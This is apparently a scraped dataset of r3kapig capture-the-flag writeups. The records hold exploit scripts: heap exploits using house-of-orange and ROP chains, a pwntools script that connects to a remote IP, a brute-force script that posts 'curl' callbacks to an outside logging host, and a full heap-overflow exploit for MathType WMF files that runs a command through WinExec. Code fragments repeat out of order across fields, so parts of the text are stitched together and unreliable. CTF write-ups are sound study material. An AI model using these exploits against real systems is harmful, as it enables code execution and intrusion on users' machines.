0x1A7F, 0x1AE7, 0xF26, 0x1B34, 0x1AD0, 0xD7C, 0xFC9, 0xE7E, 0x1C0E, 0x1BAE]\n\npwd = ''\nfor i in xrange(0x20):\n    k = i * (i + 1) / 2\n    r = None\n    for c in xrange(0x20, 0x7F):\n        t = ((k + 0x1024) * c) >> 6\n        if t == secret[i]:\n            r = c\n            break\n    assert r != None\n    pwd += chr(r)\n\nprint('\\x32\\x63\\x62\\x63\\x61' + pwd)\n\n'ZmxhZ3ttYWZha3VhaWxhaXFpYW5kYW9ifQ=='.decode('base64')\n\nfrom mpz import gcd,invert\nq=gcd(n1,n2)\np=n1/q\nflag=pow(res,invert(e,(p-1)*(q-1)),n1)\n\nfrom __future__ import print_function\nfrom pwn import *\nimport hashlib\nimport struct\nimport time\nimport random\nimport subprocess\nfrom ctypes import c_int32\nfrom randcrack import RandCrack\n\n# context.log_level = 'debug'\n\nio = remote('119.3.245.36', 23456)\nio.recvline()\nsha_hash = io.recvline().split('=')[1].strip()\nprint('hash', repr(sha_hash))\n\nhead_str = io.recvline().split('=')[1].strip().decode('hex')\n\ndef pow():\n    for i in range(256):\n        print('i: {}/256'.format(i))\n        for j in range(256):\n            for k in range(256):\n                tail_str = struct.pack('ccc', chr(i), chr(j), chr(k))\n                full_str = head_str + tail_str\n                sha1 = hashlib.sha256()\n                sha1.update(full_str)\n                temp_hash = sha1.hexdigest()\n                if temp_hash == sha_hash:\n                    return full_str\npow_ans = pow()\nprint(pow_ans)\nio.sendlineafter(\"[-]skr.encode('hex')=\", pow_ans.encode('hex'))\nio.sendlineafter(\"[+]teamtoken:\", \"our_token_lol\")\n\nio.recvuntil('Generating challenge 1\\n')\n\nprint(\"Challenge 1\")\nrandom.seed(int(time.time()))\nrand_it = random.randint(0,2**64)\nio.sendlineafter('[-]', str(rand_it))\n\n\nprint(\"Challenge 2\")\nio.recvuntil('Generating challenge 2\\n')\nv1 = c_int32(int(io.recvline().split(']')[1])).value\nif v1 < 0:\n    v1 += 1\nv2 = c_int32(int(io.recvline().split(']')[1])).value\nif v2 < 0:\n    v2 += 1\n\no = subprocess.check_output('foresee java nextInt -o {} {} -c 1'.format(v1, v2).split())\nv3 = int(o.strip())\n\nprint('v=', v1, v2, v3)\nio.sendlineafter('[-]', str(v3))\n\nprint(\"Challenge 3\")\nio.recvuntil('Generating challenge 3\\n')\n\ndef read_randbits():\n    io.sendlineafter('[-]', '0')\n    return int(io.recvline().split(':')[1])\n\nrc = RandCrack()\nfor i in xrange(624):\n    t = read_randbits()\n    print(t)\n    rc.submit(t)\n\ntarget = rc.predict_getrandbits(32)\nio.sendlineafter('[-]', str(target))\n\n\nio.interactive()\n\n    print hex(fakechunk[i])\n    delete(i+3)\n    add(str((i+3))*8+p64(fakechunk[i]))\n\n\n    print(message + '0x'+ i32_to_u32(int64_value.hi).toString(16) + i32_to_u32(int64_value.lo).toString(16));\n\n\n    var f_lo = i32[0], f_hi = i32[1];\n    print64({hi:f_hi, lo:f_lo}, '[*] function address:');\n\n\n    f64[0]=arr2[1];\n    var base_lo = i32[0], base_hi = i32[1];\n    i32[0] = base_lo + 0x58;\n    print64({hi:i32[1], lo:i32[0]}, '[*] fake_object address:');\n    arr2[1] = f64[0];\n\n\n    dv=arr2[1];\n    addressOf(dv);\n    var f_leak_int64 = { hi :f_hi, lo : f_lo };\n    print64(f_leak_int64, '[*] wasm obj address:');\n    pause();\n\n\n        set_int('\\x01', 0, base + 0x201F90)\n        show('\\x00', 0)\n        p.recvuntil('Content:')\n        libc.address = u64(p.recvuntil('\\n', drop=1).ljust(8, '\\x00'))-libc.symbols['printf']\n\n\n    for i in range(256):\n        print('i: {}/256'.format(i))\n        for j in range(256):\n            for k in range(256):\n                tail_str = struct.pack('ccc', chr(i), chr(j), chr(k))\n                full_str = head_str + tail_str\n                sha1 = hashlib.sha256()\n                sha1.update(full_str)\n                temp_hash = sha1.hexdigest()\n                if temp_hash == sha_hash:\n                    return full_str\n\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n\n\n    print \"=== solution found ===\"\n    if False:\n        print \"x:\", solx\n        print \"y:\", soly\n\n\n    d = int(pol(solx, soly) / e)\n    print \"private key found:\", d\n\n\n    print \"=== no solution was found ===\"\n\n\n    for i in range(256):\n        print('i: {}/256'.format(i))\n        for j in range(256):\n            for k in range(256):\n                tail_str = struct.pack('ccc', chr(i), chr(j), chr(k))\n                full_str = head_str + tail_str\n                sha1 = hashlib.sha256()\n                sha1.update(full_str)\n                temp_hash = sha1.hexdigest()\n                if temp_hash == sha_hash:\n                    return full_str\n\n\n    t = read_randbits()\n    print(t)\n    rc.submit(t)\n\n\n       data = {i.strip():'phpinfo();'}\n       a = requests.post('http://127.0.0.1/'+file,data=data)\n       if 'PHP Version' in a.content:\n           print 'ok'+i\n           exit()\n       data = {i.strip():'curl http://xss.f1sh.site/?{}.{}.wz5v5x.ceye.io'.format(file.encode('hex'), i.encode('hex'))}\n       a = requests.post('http://127.0.0.1/'+file,data=data)\n\n\n       a = requests.get('http://127.0.0.1/'+file+'?'+i.strip()+'=phpinfo();')\n       if 'PHP Version' in a.content:\n           print 'ok'+i  \n           exit()\n       data = {i.strip():'curl http://xss.f1sh.site/?{}.{}.wz5v5x.ceye.io'.format(file.encode('hex'), i.encode('hex'))}\n       a = requests.get('http://127.0.0.1/'+file,params=data)\n", "tools": ["sage", "python", "pycryptodome", "gmpy2", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20190528-qwb\\README.md", "file_size": 45445, "scraped_at": "2025-10-26T18:19:25.641558"}
{"id": "r3kapig_writeup_Defcon_China_CTF(BCTF)_1.0_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "Defcon China CTF(BCTF) 1.0 Writeup", "attack_type": "XOR", "writeup": "# Defcon China CTF(BCTF) 1.0 Writeup\n\nHappy Children's Day, hackers! I know you all hacked the time, so you may stay young forever, haha.\n\nAnyway, thanks for participating BCTF. It's a tough task to keep all the challenges as good as possible in such a short time. As we are not the only one writing challenges, here is the list of challenges that from our hands. Other challenges will not be covered in this writeup, as it's not our work. Really hope you guys enjoyed the challenges, and please do contact us if you have anything to complain about the challenges.\n\n\n\nChallenges from us include:\n\ntrispl, ruscas, echos, myheart, snake, lut, lut revenge, speedapp1, speedapp2 and router.\n - [Defcon China CTF(BCTF)](#defcon-china-ctfbctf)\n   - [Challenge Writeup](#challenge-writeup)\n     - [trispl](#trispl)\n     - [Ruscas](#ruscas)\n     - [echos](#echos)\n       - [1. program info](#1-program-info)\n       - [2. bug](#2-bug)\n       - [3. exploit](#3-exploit)\n     - [myheart](#myheart)\n     - [Snake](#snake)\n     - [lut](#lut)\n     - [lut revenge](#lut-revenge)\n     - [speedapp1](#speedapp1)\n     - [speedapp2](#speedapp2)\n     - [router](#router)\n\n## Writeup\n\n### trispl\n\nFast correlation attack based on LFSR sampling is investigated. The geffe generator is used to carry out fast correlation attacks, but all three LFSRs are sampled. Firstly, you need to do a fast correlation attack to establish the equation. Secondly, the sampling sequence is need to be reversed to the original sequence.The chaotic sequence established by fast correlation attack is related to the first and third sampling sequence respectively. All three LFSRs use primitive polynomials, which are not decomposable and can not use decomposition attack. After fast correlation attack, we use anti-sampling to find the initial state, which is flag.\n\n### Ruscas\n\n```Rust\n//! # Intro\n//!\n//! Compile using `rustc -O`, report wrong if result is less than 0\n//! else all report normal.\n//!\n//! Core idea is to using internal compiler bug to distinguish between\n//! true and false. \n//!\n//! # Key Points\n//!\n//! There are multiple parts that I intended to test the players:\n//!\n//! - \"include_bytes!\" macro that can get arbitrary file content at the\n//!   compile time\n//!\n//! - const fn calculation, which the only distinguishable implemented\n//!   [arithmetic feature](https://github.com/rust-lang/rust/issues/53718) \n//!   is the \"is_negative\" and \"is_positive\" on integer type.\n//!\n//! - use inline assembly bug to make it possible to be optimized away\n//!   without triggering. There's a lot of ICE (internal compiler error)\n//!   to trigger, however, not all of them is good enough to handle this\n//!   case. For example, the borrow checker bug will panic before the\n//!   dead code elimination happens, so it will panic wherever you put it.\n//!\n//! # Intention\n//!\n//! Original intention is to \"attack the online judge services with Rust\".\n//! This comes to me as I search throw `Rust` stdlib's documentation and\n//! find out \"include_*\" functions that work at compile time. Most online\n//! judge systems can tell you if you program successfully compiles, these\n//! functions may allow potential attacking to read arbitrary contents.\n//!\n//!\n//! # Potential Problems\n//!\n//! There might be potential unintended solutions possible.\n//! One that is already encountered and considered is that one can leverage\n//! the constant checker to get a different result when compiling.\n//!\n//! For example, it is possible to make it not compilable given\n//! `(FLAG_BYTE as u32 - b'g' as u32) as i32` as if the FLAG_BYTE is `f`,\n//! this will cause an overflow in constant which will be prevented by compiler.\n//!\n//! Since this case will only cause the compiler to fail instead of error,\n//! the return value is 1 instead of other minus values. So as a counter measure,\n//! I changed the return value check part to be \"more than 0x7f (less than 0) or not\".\n//!\n//! Still, I'm not 100 percent sure if there exists any other unintended solutions.\n#![feature(const_fn, asm)]\n\n/// This will get one byte out of flag, compare it with different bytes to get\n/// the whole flag\nconst VALUE: i32 = (include_bytes!(\"./flag\")[0] - b'g') as i32;\n\nconst fn guess() -> bool {\n    VALUE.is_negative() // false\n}\n\nextern fn test() {}\n\nfn main() {\n    // Use this difference to get to know flag\n    if guess() {\n        // optimize away\n    } else {\n        // compiles\n        unsafe { asm!(\"call $0\" :: \"i\"(test) :: \"intel\"); }\n    }\n}\n```\n\nComplete solution (in Ocaml :P) using binary search:\n\n```OCaml\n(* usage: ocaml unix.cma str.cma exp.ml *)\nopen Unix\n\nlet connect_service addr port =\n    let inet_addr = (gethostbyname addr).h_addr_list.(0) in\n    let sockaddr = ADDR_INET (inet_addr, port) in\n    let sock = socket PF_INET SOCK_STREAM 0 in\n    connect sock sockaddr;\n    let outchan = out_channel_of_descr sock in\n    let inchan = in_channel_of_descr sock in\n    (inchan, outchan)\n\nlet done_regexp = Str.regexp \"Done\"\n\n(** generate exploit R", "solution_code": "from pwn import *\n\ncontext.terminal = ['guake', '-n', os.getcwd(), '-e']\ncontext.log_level = 'debug'\npc='./echos'\n#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')\nlibc = ELF('./libc-2.23.so')\n\ndef ru(a):\n    p.recvuntil(a)\n\ndef sa(a,b):\n    p.sendafter(a,b)\n\ndef sla(a,b):\n    p.sendlineafter(a,b)\n\ndef echo(size,content):\n    p.sendline(str(size))\n    sleep(1)\n    p.send(content)\n    k=p.recvline()\n    return k\n\ndef pad(n):\n    return '0'*n\n\ndef house_of_orange(libc,libc_addr):\n    _IO_str_jumps_addr = libc_addr + libc.symbols['sys_sigabbrev'] + 0x1940\n    payload = p64(0xfffffffffffffffe) + p64(0x61) + pad(8) + p64(libc_addr + libc.symbols['_IO_list_all']-0x10)\n    payload+= p64(2) + p64(3) + pad(8) + p64(libc_addr + libc.search('/bin/sh').next())\n    payload+= pad(0x80)\n    payload+= p64(0xffffffffffffffff) + pad(0x10) + p64(_IO_str_jumps_addr-0x8)\n    payload+= pad(8) + p64(libc_addr + libc.symbols['system'])\n    return payload\n\ndef hack():\n    base = 0x0000555555554000\n    echo(0x38,'A'*8)\n    echo(0x28,'A'*8)\n    echo(0x48,'A'*8)\n    echo(0x7f,'A'*8)\n    k=echo(0x28,'A'*8)\n    leak_value =u64(k[8:16])\n    print (hex(leak_value))\n    libc_base=leak_value-0x3c4b78\n    print 'libc_base:', hex(libc_base)\n    size = libc_base&0xfff000-0x1000\n    io_list_all = libc.symbols['_IO_list_all']+libc_base\n    print 'IO_list_all:', hex(io_list_all)\n    pading = ((io_list_all&0xff)+0x10)*'a'\n\n    if (io_list_all&0xffffffffff000000) != (libc_base&0xffffffffff000000):\n        print('fail, try again')\n        return\n    echo(size, pading+house_of_orange(libc, libc_base))\n\n    if size < 0x200000:\n        echo(size, pading+house_of_orange(libc, libc_base))\n\n    echo(0x90,'A'*8)\n    echo(0x28,'A'*8)\n    echo(0x90,'A'*8)\n    p.sendline(str(io_list_all+2))\n    sleep(1)\n    p.sendline(str(io_list_all+3))\n    sleep(1)\n    print 'io_list_all:', hex(io_list_all)\n\n    p.clean()\n    main_arena = libc_base + 0x3c4b20\n\n    p.sendline(str(main_arena+0x70+1)) #unsort bin\n    sleep(1)\n    p.sendline(str(main_arena+0x70+1)) #unsort bin\n    p.interactive()\n\np = process(pc)\nhack()\n\n\n    Printf.sprintf \"#![feature(const_fn, asm)]\n\n\n    let pass_hint inchan =\n        for i = 1 to 4 do\n            input_line inchan |> ignore;\n            done in\n    let inchan, outchan =\n        connect_service host port in\n    begin\n        pass_hint inchan;\n        let code = gen_exploit_code index ch in\n        begin\n            (* print_endline (\"sending: \" ^ code); *)\n            output_string outchan code;\n            flush outchan;\n            input_line inchan |> ignore; (* compiling... *)\n            let res = input_line inchan in\n            begin\n                print_endline res;\n            if Str.string_match done_regexp res 0 then\n                true\n            else\n                false\n            end\n        end\n    end\n\n\n    let rec binary_search_bruteforce index left right =\n        if left < right then\n            begin\n                print_endline (Printf.sprintf \"left: %d\" left);\n                print_endline (Printf.sprintf \"right: %d\" right);\n            let mid = (left + right) / 2 + 1 in\n            if is_less index mid ~host ~port then\n                binary_search_bruteforce index left (mid - 1)\n            else\n                binary_search_bruteforce index mid right\n            end\n        else\n            right\n    in binary_search_bruteforce index 17 127\n\n\n    let len = String.length cur in\n    begin\n    if len < 0x20 then\n        bruteforce len ~host ~port |>\n        Char.chr |>\n        String.make 1 |>\n        fun x -> begin\n            print_endline (\"cur: \" ^ cur ^ x);\n            getflag (cur ^ x) ~host ~port\n        end\n    else\n        cur\n    end\n\n\n    print_endline \"start\";\n    getflag \"\" ~host:\"localhost\" ~port:50806 |>\n        print_endline;\n\n\n    base = 0x0000555555554000\n    echo(0x38,'A'*8)\n    echo(0x28,'A'*8)\n    echo(0x48,'A'*8)\n    echo(0x7f,'A'*8)\n    k=echo(0x28,'A'*8)\n    leak_value =u64(k[8:16])\n    print (hex(leak_value))\n    libc_base=leak_value-0x3c4b78\n    print 'libc_base:', hex(libc_base)\n    size = libc_base&0xfff000-0x1000\n    io_list_all = libc.symbols['_IO_list_all']+libc_base\n    print 'IO_list_all:', hex(io_list_all)\n    pading = ((io_list_all&0xff)+0x10)*'a'\n\n\n    if (io_list_all&0xffffffffff000000) != (libc_base&0xffffffffff000000):\n        print('fail, try again')\n        return\n    echo(size, pading+house_of_orange(libc, libc_base))\n\n\n    echo(0x90,'A'*8)\n    echo(0x28,'A'*8)\n    echo(0x90,'A'*8)\n    p.sendline(str(io_list_all+2))\n    sleep(1)\n    p.sendline(str(io_list_all+3))\n    sleep(1)\n    print 'io_list_all:', hex(io_list_all)\n", "tools": ["python", "burp"], "file_path": "temp_repos\\r3kapig_writeup\\20190601-defconchina\\README.md", "file_size": 14622, "scraped_at": "2025-10-26T18:19:25.665535"}
{"id": "r3kapig_writeup_MTP_Writeup_(0day)", "team": "r3kapig", "repo": "writeup", "challenge_name": "MTP Writeup (0day)", "attack_type": "XOR", "writeup": "# MTP Writeup (0day)\n\nLast week I solved an interesting challenge, which is actually a 0day bug.  \n\nWe were given a software called [MathType](https://www.dessci.com/en/products/mathtype/), and we need to pop a calc by using a wmf file with the modified version of this software.\n\nIt also said it is an unpatched heap overflow bug, so let's begin!\n\n## Writeup\n\n### Reversing\n\nThe first thought after I saw the challenge description was we need a fuzzing, but I wanna reverse and locate the code processing wmf file.\n\nSimply generating a wmf file by File->Save menu, attach with your debugger and put a breakpoint at **CreateFileW**(I believe they don't use some hack trick like NtCreateFile or direct syscall). \n\nNow load the file you just saved, breakpoint triggered immediately.\n\nBtw, They ***removed*** ASLR in patched version of MathType.\n\n![CreateFile](img/1.jpg)\n\nBut where is the code that actually process WMF file? Now put a breakpoint at ***ReadFile***.\n\nHere is the stack trace when we hit ReadFile.\n\n![ReadFile](img/2.jpg)\n\nNow we inspect the code at 0x004555AC , as below.\n\n![](img/3.jpg)\n\n![](img/4.jpg)\n\n![](img/5.jpg)\n\nLet's dig deeper and see what this proc does.\n\n![](img/6.jpg)\n\nWell, we don't need to fuzz anymore :).\n\n### WMF format\n\nSo what the heck is wmf? \n\n> **Windows Metafile**(**WMF**) is an [image file format](https://en.wikipedia.org/wiki/Image_file_format) originally designed for [Microsoft Windows](https://en.wikipedia.org/wiki/Microsoft_Windows) in the 1990s. Windows Metafiles are intended to be portable between applications and may contain both [vector graphics](https://en.wikipedia.org/wiki/Vector_graphics) and [bitmap](https://en.wikipedia.org/wiki/Bitmap) components. It acts in a similar manner to [SVG](https://en.wikipedia.org/wiki/SVG) files.\n\nMSDN also offers the [specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/4813e7fd-52d0-4f42-965f-228c8b7488d2) for wmf file.\n\nThank god someone wrote a parser in 010editor. Which really helps us for understanding WMF file.\n\nWe can see the structure of WMF file is relatively simple.\n\n![](img/7.jpg)\n\nA special header and a normal header, records follows after.\n\nWait WTF is that checksum? How we compute it?\n\n![](img/8.jpg)\n\nOK, seems a very simple checksum algorithm. Simply xor each byte.\n\n### Construction and Exploitation \n\nNow we saw an unlimited heap overflow bug by reversing program, but how to trigger it?\n\nLet's review the code.\n\n![](img/6.jpg)\n\nI bet u know nothing about what the heck is 1574 record function and what is 15 escape function. :)\n\nLet's seek our answer in [MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/cfc88064-d86d-4b52-9374-3ce27d456179).\n\n1574 is actually 0x626 in hex which represents an ESCAPE record, and function 15 refers a META_ESCAPE_ENHANCED_METAFILE record.\n\n> The **META_ESCAPE_ENHANCED_METAFILE Record** is used to embed an [EMF](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/bd05c35c-3eb1-49cc-90df-651b1f73f15a#gt_d9d0bff9-d270-4528-9081-fe51db809c36) [metafile](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/bd05c35c-3eb1-49cc-90df-651b1f73f15a#gt_ae5f028e-7e28-4a0b-bec6-2c87913f7db7) within a [WMF](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/bd05c35c-3eb1-49cc-90df-651b1f73f15a#gt_48849cf6-d55c-47e5-b041-13b65854de2b) metafile. The EMF metafile is broken up into sections, each represented by one **META_ESCAPE_ENHANCED_METAFILE**.\n\nAh, we can embed some data in this record, clearly our program takes advantage of this feature and embed some of their custom structure inside.\n\nSo what's the structure look like? Here's an example.\n\n![](img/9.jpg)\n\nA bit of messy, never mind :)\n\nNow we know how to trigger the overflow, but what can we do with a simple heap overflow?\n\nThey also added some code in patched version, let's see.\n\nI always check if the program is packed before reversing, and something interesting catches my eye.\n\n![](img/10.jpg)\n\nClearly they add some code in this section, let's see.\n\n![](img/11.jpg)\n\nHmm, a modified wmf process function.\n\n![](img/12.jpg)\n\nThey also added some interesting functions which I have no idea what they do.\n\n![](img/13.jpg)\n\n![](img/14.jpg)\n\nAlso, there's new function that can arrange heap layout to what we want.\n\n![](img/15.jpg)\n\nSo ideally we allocate some buffer with 0x108 size to fill the heap hole, and allocate vuln buffer with META_ESCAPE_ENHANCED_METAFILE record, but don't trigger oob. Buffer contains function pointer should be allocated right after our vuln buffer. Next time we can oob the heap and overwrite the function pointer to achieve RCE.\n\n![](img/16.jpg)\n\nBy controlling eip, we can pivot the stack and do ROP, simply write a \"calc\" in data segment and call WinExec .\n\n![](img/17.jpg)\n\n![](img/18.jpg)\n\n### Full exploit code\n\n```python\n# -- coding:utf-8 --\n# Python3 required\nfrom struct import *\nimport base64\n\n\ndef p32(data):\n    return pack('<I', data)\n\n\ndef ", "solution_code": "# -- coding:utf-8 --\n# Python3 required\nfrom struct import *\nimport base64\n\n\ndef p32(data):\n    return pack('<I', data)\n\n\ndef p16(data):\n    return pack('<H', data)\n\n\nclass Header:\n    def __init__(self):\n        self.key = 0x9AC6CDD7\n        self.HWmf = 0\n        self.left = self.top = self.right = self.bottom = self.inch = self.reserved = 0\n        self.type = 1\n        self.HeaderSize = 9\n        self.version = 0x300\n        self.size = 9\n        self.NumberOfObjects = 0\n        self.MaxRecord = 0x100\n        self.NumberOfMembers = 0\n        self.Records = []\n\n    def __bytes__(self):\n\n        self + Record()\n\n        s = pack('<I', self.key)\n        s += pack('<H', self.HWmf)\n        s += pack('<H', self.left)\n        s += pack('<H', self.top)\n        s += pack('<H', self.right)\n        s += pack('<H', self.bottom)\n        s += pack('<H', self.inch)\n        s += pack('<I', self.reserved)\n        s += pack('<H', self.checksum(s))\n\n        s += p16(self.type)\n        s += p16(self.HeaderSize)\n        s += p16(self.version)\n        s += p32(self.size)\n        s += p16(self.NumberOfObjects)\n        s += p32(self.MaxRecord)\n        s += p16(self.NumberOfMembers)\n\n        for r in self.Records:\n            s += bytes(r)\n        return s\n\n    def checksum(self, s):\n        c = 0\n        for x in range(int(len(s) / 2)):\n            c ^= unpack('<H', s[2 * x:2 * x + 2])[0]\n        return c\n\n    def __add__(self, other):\n        self.Records.append(other)\n        rs = len(bytes(other))\n        if rs > self.MaxRecord:\n            self.MaxRecord = rs\n        self.size += int(rs / 2)\n        return self\n\n\nclass Record:\n    def __init__(self):\n        self.RecordFunction = 0\n        self.RecordSize = 3\n\n    def __bytes__(self):\n        s = p32(self.RecordSize)\n        s += p16(self.RecordFunction)\n        return s\n\n\nclass PWNRecord(Record):\n    def __init__(self, size, buf=None):\n        super(PWNRecord, self).__init__()\n        self.RecordFunction = 0x2019\n        self.size = size\n        self.buf = buf\n        if self.buf:\n            length = len(buf)\n            if length & 1:\n                length += 1\n                buf += '\\x00'.encode()\n            self.RecordSize += 4 + int(length / 2)\n        else:\n            self.RecordSize += 6\n\n    def __bytes__(self):\n        s = super(PWNRecord, self).__bytes__()\n        s += p32(0x233)\n        s += p32(self.size)\n        if self.buf:\n            s += self.buf\n        else:\n            s += p32(0)\n        return s\n\n\nclass EMFRecord(Record):\n    def __init__(self, data):\n        super(EMFRecord, self).__init__()\n        self.RecordFunction = 1574\n\n        self.efun = 0\n        self.bytecount = 0\n        self.CommentIdentifier = 'AppsMFCC'.encode()\n\n        self.RecordSize += 11\n        length = len(data)\n        if length & 1:\n            data += '\\x00'.encode()\n            length += 1\n\n        self.RecordSize += int(length / 2)\n        self.alloc_size = 0\n        self.buff_size = 0\n        self.version = 1\n        if isinstance(data, str):\n            self.data = data.encode()\n        else:\n            self.data = data\n\n    def __bytes__(self):\n        s = super(EMFRecord, self).__bytes__()\n        s += p16(self.efun)\n        s += p16(self.bytecount)\n        s += self.CommentIdentifier\n        s += p16(self.version)\n        s += p32(self.alloc_size)\n        s += p32(self.buff_size)\n        s += self.data\n        return s\n\n\nif __name__ == '__main__':\n    h = Header()\n    h.right = 7168\n    h.bottom = 512\n    h.inch = 2304\n    h + PWNRecord(0x20, 'cmd.exe\\x00'.encode())\n    for x in range(1000):\n        h + PWNRecord(0x108)\n\n    payload = 'Design Science, Inc.\\x00'.encode()\n    # original data from test\n    payload += base64.b64decode('''BQEABwREU01UNwAAE1dpbkFsbEJhc2ljQ29kZVBhZ2VzABEFVGltZXMgTmV3IFJv\nbWFuABEDU3ltYm9sABEFQ291cmllciBOZXcAEQRNVCBFeHRyYQATV2luQU5TSQAR\nBlRlYW1WaWV3ZXIxMwASAAghL0WPRC9BUPQQD0dfQVDyHx5BUPQVD0EA9EX0JfSP\nQl9BAPQQD0NfQQD0j0X0Kl9I9I9BAPQQD0D0j0F/SPQQD0EqX0RfRfRfRfRfQQ8M\nAQABAAECAgICAAIAAQEBAAMAAQAEAAUACgAA\n''')\n\n    e = EMFRecord(payload)\n    e.efun = 0xf\n    e.bytecount = 0xff\n    e.alloc_size = 0x108\n    e.buff_size = 0xda\n\n    h + e\n\n    payload = 'Design Science, Inc.\\x00'\n    payload += 'A' * 0x3e\n\n    payload = payload.encode()\n\n    payload += p32(0x00753053)  # gadget 1 0x00753053: pop esi ; pop esp ; pop ebp ; ret  ;  (6 found)\n    payload += p32(0x0043b056)  # 0x0043b056: add esp, 0x18 ; ret  ;  (2 found)\n    payload += 'Design Science, Inc.\\x00\\x00\\x00\\x00'.encode()\n\n    # 0x004f086e: pop eax ; ret  ;  (51 found)\n    # 0x004f0e9c: mov dword [ecx], eax ; ret\n    # 0x0040359f: pop ecx ; ret  ;  (934 found)\n\n    payload += p32(0x004f086e)\n    payload += p32(0x636c6163)\n    payload += p32(0x0040359f)\n    payload += p32(0x00619FC0)\n    payload += p32(0x004f0e9c)\n\n    payload += p32(0x04EDB7E)  # WinExec\n    payload += p32(0x583190)  # ExitProcess\n    payload += p32(0x00619FC0)\n    payload += p32(5)\n\n    e = EMFRecord(payload)\n    e.efun = 0xf\n    e.bytecount = 0x100\n    e.alloc_size = 0x108  # it doesn't matter\n    e.buff_size = len(payload)  # oob\n\n    h + e\n\n    with open('exp.wmf', 'wb') as f:\n        f.write(bytes(h))\n\n    def __init__(self):\n        self.key = 0x9AC6CDD7\n        self.HWmf = 0\n        self.left = self.top = self.right = self.bottom = self.inch = self.reserved = 0\n        self.type = 1\n        self.HeaderSize = 9\n        self.version = 0x300\n        self.size = 9\n        self.NumberOfObjects = 0\n        self.MaxRecord = 0x100\n        self.NumberOfMembers = 0\n        self.Records = []\n\n\n    def __bytes__(self):\n\n\n    def checksum(self, s):\n        c = 0\n        for x in range(int(len(s) / 2)):\n            c ^= unpack('<H', s[2 * x:2 * x + 2])[0]\n        return c\n\n\n    def __add__(self, other):\n        self.Records.append(other)\n        rs = len(bytes(other))\n        if rs > self.MaxRecord:\n            self.MaxRecord = rs\n        self.size += int(rs / 2)\n        return self\n\n\n    def __init__(self):\n        self.RecordFunction = 0\n        self.RecordSize = 3\n\n\n    def __bytes__(self):\n        s = p32(self.RecordSize)\n        s += p16(self.RecordFunction)\n        return s\n\n\n    def __init__(self, size, buf=None):\n        super(PWNRecord, self).__init__()\n        self.RecordFunction = 0x2019\n        self.size = size\n        self.buf = buf\n        if self.buf:\n            length = len(buf)\n            if length & 1:\n                length += 1\n                buf += '\\x00'.encode()\n            self.RecordSize += 4 + int(length / 2)\n        else:\n            self.RecordSize += 6\n\n\n    def __bytes__(self):\n        s = super(PWNRecord, self).__bytes__()\n        s += p32(0x233)\n        s += p32(self.size)\n        if self.buf:\n            s += self.buf\n        else:\n            s += p32(0)\n        return s\n\n\n    def __init__(self, data):\n        super(EMFRecord, self).__init__()\n        self.RecordFunction = 1574\n\n\n    def __bytes__(self):\n        s = super(EMFRecord, self).__bytes__()\n        s += p16(self.efun)\n        s += p16(self.bytecount)\n        s += self.CommentIdentifier\n        s += p16(self.version)\n        s += p32(self.alloc_size)\n        s += p32(self.buff_size)\n        s += self.data\n        return s\n\n\n    payload = 'Design Science, Inc.\\x00'.encode()\n    # original data from test\n    payload += base64.b64decode('''BQEABwREU01UNwAAE1dpbkFsbEJhc2ljQ29kZVBhZ2VzABEFVGltZXMgTmV3IFJv\n", "tools": ["python"], "file_path": "temp_repos\\r3kapig_writeup\\20190617-qwbfinal\\README.md", "file_size": 10205, "scraped_at": "2025-10-26T18:19:25.684916"}
{"id": "r3kapig_writeup_TokyoWesterns_CTF_5th_2019_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "TokyoWesterns CTF 5th 2019 Writeup", "attack_type": "Hash", "writeup": "# TokyoWesterns CTF 5th 2019 Writeup\n\n## Pwn\n\n\n### nothing more to say\n\n```python\n#! /usr/bin/env python2\n# -*- coding: utf-8 -*-\n# vim:fenc=utf-8\n#\n# Copyright © 2018 anciety <anciety@anciety-pc>\n#\n# Distributed under terms of the MIT license.\nimport sys\nimport os\nimport os.path\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\ncontext.terminal = ['ancyterm', '-s', '192.168.142.1', '-t', 'alacritty', '-e']\n\n# synonyms for faster typing\ntube.s = tube.send\ntube.sl = tube.sendline\ntube.sa = tube.sendafter\ntube.sla = tube.sendlineafter\ntube.r = tube.recv\ntube.ru = tube.recvuntil\ntube.rl = tube.recvline\ntube.rr = tube.recvregex\ntube.irt = tube.interactive\n\nif len(sys.argv) > 2:\n    DEBUG = 0\n    HOST = sys.argv[1]\n    PORT = int(sys.argv[2])\n\n    p = remote(HOST, PORT)\nelse:\n    DEBUG = 1\n    if len(sys.argv) == 2:\n        PATH = sys.argv[1]\n\n    p = process(PATH)\n\n\n# by w1tcher who dominates pwnable challenges\ndef house_of_orange(head_addr, system_addr, io_list_all):\n    payload = b'/bin/sh\\x00'\n    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)\n    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4\n    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \\\n            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)\n    return payload\n\n\norig_attach = gdb.attach\ndef gdb_attach(*args, **kwargs):\n    if DEBUG:\n        orig_attach(*args, **kwargs)\ngdb.attach = gdb_attach\n\n\ndef main():\n    # Your exploit script goes here\n    p.ru(':)\\n')\n    pop_rdi = 0x400773\n    gets = 0x400580\n\n    ropchain = p64(pop_rdi)\n    ropchain += p64(0x601090)\n    ropchain += p64(gets)\n    ropchain += p64(0x601090)\n\n    payload = 'a' * 0x108 + ropchain\n\n    shellcode = shellcraft.sh()\n    gdb.attach(p)\n    p.sl(payload)\n    p.sl(asm(shellcode))\n    p.irt()\n\nif __name__ == '__main__':\n    main()\n\n\n```\n\n### Multi Heap\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef Alloc(which, size, where):\n    p.recvuntil('Your choice: ')\n    p.sendline('1')\n    p.recvuntil('Which: ')\n    p.sendline(which)\n    p.recvuntil('Size: ')\n    